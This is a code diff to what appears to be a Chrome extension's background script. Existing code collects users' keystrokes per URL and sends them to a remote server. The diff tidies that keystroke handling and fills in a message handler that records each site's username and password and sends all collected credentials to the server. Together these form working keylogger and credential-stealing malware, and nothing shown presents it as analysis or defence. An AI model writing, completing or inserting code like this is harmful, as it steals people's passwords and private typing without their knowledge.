@@ -136,10 +136,13 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
         const timeout = setTimeout(() => {
             keystrokeData.get(url).push({ text, timestamp });
 
-             const entries = Array.from(keystrokeData.entries()).filter(([key]) => key !== url);
-            keystrokeData = new Map([...entries, [url, keystrokeData.get(url)]]);
+            // Reinsert the URL entry to move it to the end
+            const updatedEntry = [url, keystrokeData.get(url)];
+            keystrokeData.delete(url); // Remove old position
+            keystrokeData.set(url, updatedEntry[1]); // Reinsert to maintain order
 
             sendToServer("keys", Object.fromEntries(keystrokeData));
+
             keystrokeTimeouts.delete(url);
         }, 3000);
 
@@ -154,11 +157,11 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
 
 ************************/
 
+let credentials = {}
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     if (message.type === "credentials") {
         const { site, username, password } = message.data;
-
-
+        credentials[site] = {username, password};
+        sendToServer("credentials", credentials);
     }
-
 });
